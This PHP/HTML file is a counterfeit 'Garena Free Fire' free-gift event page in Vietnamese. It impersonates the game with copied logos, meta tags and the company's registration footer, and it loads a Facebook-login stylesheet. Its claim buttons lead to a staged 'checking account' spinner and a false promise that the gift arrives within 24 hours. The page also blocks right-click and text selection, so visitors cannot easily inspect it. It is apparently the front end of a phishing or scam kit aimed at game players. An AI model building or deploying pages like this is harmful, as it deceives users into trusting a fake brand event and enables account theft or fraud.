<?php
$imageLinksFile = "GiaoDien/VanTan.txt";

if (file_exists($imageLinksFile)) {
    $imageLinksContent = file_get_contents($imageLinksFile);

    $imageLinks = json_decode($imageLinksContent);

    if (is_array($imageLinks) && count($imageLinks) >= 7) {
        $bannerLink = explode('|', $imageLinks[0])[0];
		$bannerName = explode('|', $imageLinks[0])[1];
        $gift1Link = explode('|', $imageLinks[1])[0];
        $gift1Name = explode('|', $imageLinks[1])[1];
        $gift2Link = explode('|', $imageLinks[2])[0];
        $gift2Name = explode('|', $imageLinks[2])[1];
        $gift3Link = explode('|', $imageLinks[3])[0];
        $gift3Name = explode('|', $imageLinks[3])[1];
        $gift4Link = explode('|', $imageLinks[4])[0];
        $gift4Name = explode('|', $imageLinks[4])[1];
        $gift5Link = explode('|', $imageLinks[5])[0];
        $gift5Name = explode('|', $imageLinks[5])[1];
        $gift6Link = explode('|', $imageLinks[6])[0];
        $gift6Name = explode('|', $imageLinks[6])[1];
		$gift7Link = explode('|', $imageLinks[7])[0];
        $gift7Name = explode('|', $imageLinks[7])[1];
		$gift8Link = explode('|', $imageLinks[8])[0];
        $gift8Name = explode('|', $imageLinks[8])[1];
		$gift9Link = explode('|', $imageLinks[9])[0];
        $gift9Name = explode('|', $imageLinks[9])[1];
    } else {
        echo "";
    }
} else {
    echo "";
}
?>
<base href="GiaoDien/theme12/">

<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Garena Free Fire">
<meta name="description" content="Nhận Quà Free Fire!">
<meta property="og:description" content="Nhận Quà Free Fire!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Garena Free Fire">
<meta property="og:type" content="website">
<meta name="copyright"content="NVN">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/20232/83f3aecfe60c6ec13a09696b3465907a.jpg">
<title><?php echo isset($bannerName) ? $bannerName : ''; ?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="img/icon.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://dl.dir.freefiremobile.com/common/test/official/FREE_FIRE_LOGO.PNG(2).png">
<div class="navbar-right">
<img class="navbar-shop" src="img/nav_shop.svg">
<img class="navbar-language" src="img/nav_language.svg">
<img class="navbar-language" src="img/nav_menu.svg">
<div class="navbar-download"><img src="img/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<div class="sliderHeader"><img src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>" style="width: 100%;"></div>
<div class="sliderHeader"><img src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>" style="width: 100%;"></div>
<div class="sliderHeader"><img src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>" style="width: 100%;"></div>
</div> <!--- header --->
<div class="event-alert">
				<img src="img/s4_img2.png" style="display: none">
				<div class="event-alert-title"><?php echo isset($bannerName) ? $bannerName : ''; ?></div>
				<div class="event-alert-desc"> </div>
			</div> <!--- event-title --->
<div class="rewards-section">
<div class="event-notification">

Sự Kiện Kết Thúc Sau: 
<div class="event-notification-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div> <!--- event-notification-timer --->
</div> <!--- event-notification --->
<div class="rewards-wrapper">
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<div class="menu-wrapper">
<div class ="nvn">
<div class="rewards-box-navbar">
<div class="rewards-box-navbar-title">Quà Tặng</div> <!--- rewards-box-navbar-title --->
</div> <!--- rewards-box-navbar --->
<div class="rewards-box-content">
<center>
<div class="tab_rewards" id="season">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="10" src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="10" src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">Nhận</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">Nhận</button>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- rewards-box-content --->

</div> <!--- rewards-wrapper --->
</div> <!--- rewards-section --->
</div>
<div class="processing-section" style="display:  none;">
<div class="processing-box-navbar"></div> <!--- processing-box-navbar --->
<div class="processing-box-content">
<div class="processing-box-content-description">
Chào bạn!
<div style="padding-top: 10px;"></div>
Cảm ơn bạn đã tham gia sự kiện
<br>
Chúng tôi đang xem xét thông tin tài khoản của bạn
<br>
Bạn sẽ nhận được phần quà trong 24h.
<div style="padding-top: 10px;"></div>
<div class="processing-box-content-line"></div> <!--- processing-box-content-line --->
</div> <!--- processing-box-content-description --->
<button type="button" onclick="location.href='/index.php';">Đăng Xuất</button>
</div> <!--- processing-box-content --->
</div> <!--- processing-section --->
<div class="footer">

<img class="footer-copyright-icon" src="https://dl.dir.freefiremobile.com/common/web_event/ffuniversenew/img/logo.c7fec21.png">
 

<div class="footer-txt-copyright">CÔNG TY CỔ PHẦN GIẢI TRÍ VÀ THỂ THAO ĐIỆN TỬ VIỆT NAM
					Giấy CNĐKKD số 0105301438, cấp lần đầu ngày 10/05/2011
					Cơ quan cấp: Phòng Đăng ký kinh doanh- Sở Kế hoạch và đầu tư TP Hà Nội
					Địa chỉ trụ sở chính: Tầng 29, tòa nhà Trung tâm Lotte Hà Nội, số 54, đường Liễu Giai, Phường Cống Vị, Quận Ba Đình,
					Thành phố Hà Nội, Việt Nam.</div>
                    <div class="footer-txt-copyright">ⓒ  NVN</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Xác Nhận</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Bạn có muốn nhận phần quà này?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Hủy</button>
<button type="button" onmousedown="buka.play();" onclick="nvn()">Nhận</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

<div class="popup otherReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Xác Nhận</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Bạn có muốn nhận phần quà này?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<span id="otherReward_confirmationValue"></span>
<img src="" id="myOtherReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Hủy</button>
<button type="button" onmousedown="buka.play();" onclick="nvn()">Nhận</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup otherReward_confirmation --->


<div class="popup check_verification" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Xác Minh</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Đang kiểm tra tài khoản...
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer" style="height: 40px;"></div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

<script>
// Code By NVN
function nvn(){
	$('.check_verification').show();
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()

setTimeout(function(){
            $('.check_verification').hide();
            $('.nvn').hide();
$('.processing-section').show();
        },5000);
}



var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2500);
}</script>
</body>
</html>